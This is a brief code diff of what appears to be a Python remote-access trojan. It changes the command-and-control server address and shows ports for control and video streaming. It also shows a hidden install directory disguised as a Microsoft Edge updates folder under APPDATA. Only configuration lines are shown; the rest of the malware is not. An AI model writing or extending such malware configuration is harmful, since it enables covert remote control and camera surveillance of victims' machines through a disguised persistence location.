@@ -19,7 +19,7 @@ import ctypes.wintypes
 import shutil
 import requests
 
-C2_SERVER = " 192.168.0.115"
+C2_SERVER = "172.31.88.235"
 C2_PORT = 5555
 VIDEO_PORT = 5556
 HIDDEN_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser("~")), "MicrosoftEdge", "Updates")
